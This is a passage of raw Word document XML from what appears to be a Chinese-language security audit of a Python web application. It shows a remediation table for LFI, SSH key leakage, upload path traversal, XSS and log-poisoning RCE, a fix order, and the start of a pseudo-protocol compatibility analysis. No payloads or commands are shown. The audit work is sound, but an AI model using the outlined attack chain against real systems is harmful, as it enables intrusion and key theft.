              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>依赖关系</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
          </w:tcPr>
          <w:p/>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>P0 紧急</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>1, 3, 7</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>LFI 目录穿越 / 路径编码绕过 / 未授权访问</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>/page</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t xml:space="preserve"> 路由白名单 + 登录校验 + realpath 二次防护</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>15 分钟</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>无</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
          </w:tcPr>
          <w:p/>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>P0 紧急</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>2</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>SSH 私钥泄露</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>随漏洞 1 修复自动阻断</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>0 分钟</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>依赖漏洞 1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
          </w:tcPr>
          <w:p/>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>P1 重要</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>8, 9</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>上传路径穿越 / 文件内容绕过</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>UUID 重命名 + Magic Number 校验</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>20 分钟</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>无</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
          </w:tcPr>
          <w:p/>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>P1 重要</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>6, 7(b)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>XSS 反射型</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Bleach 清洗 + 移除 `\</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>safe`</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>10 分钟</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>依赖漏洞 1 修复</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>P2 一般</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>4, 5</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>日志投毒 RCE / 内网穿透</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>随漏洞 1/6 修复自动阻断</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>0 分钟</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>依赖漏洞 1, 6</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
          </w:tcPr>
          <w:p/>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>P2 一般</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>10</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>静态文件目录暴露</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>添加安全响应头</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>5 分钟</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>无</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
          </w:tcPr>
          <w:p/>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>P0 紧急</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>11</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>原有模块越权与充值</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>已在首次审计中修复</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>已完成</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>无</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
          </w:tcPr>
          <w:p/>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="240" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:color w:val="333333"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>5.2 修复策略说明</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="80" w:after="80"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="333333"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>修复执行顺序：</w:t>
        <w:br/>
        <w:t xml:space="preserve">  第一轮（P0）：/page 白名单 + 登录校验  →  阻断 LFI 核心链路</w:t>
        <w:br/>
        <w:t xml:space="preserve">  第二轮（P1）：UUID 重命名 + Magic Number → 阻断上传攻击</w:t>
        <w:br/>
        <w:t xml:space="preserve">  第三轮（P1）：Bleach 清洗 + 移除 | safe → 阻断 XSS/SSTI</w:t>
        <w:br/>
        <w:t xml:space="preserve">  第四轮（P2）：安全响应头                 → 纵深加固</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="80" w:after="80"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="320" w:after="160"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:color w:val="1A1A2E"/>
          <w:sz w:val="30"/>
        </w:rPr>
        <w:t>六、伪协议拓展配置分析</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="240" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:color w:val="333333"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>6.1 伪协议兼容性总览</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>/page</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 路由使用 Python 原生 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>open()</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 函数，与 PHP 的 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>include/require</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 机制存在根本差异。以下为所有主流伪协议的兼容性分析：</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667eea"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>协议</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
            <w:shd w:fill="667eea"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t xml:space="preserve">PHP </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>include</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
            <w:shd w:fill="667eea"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
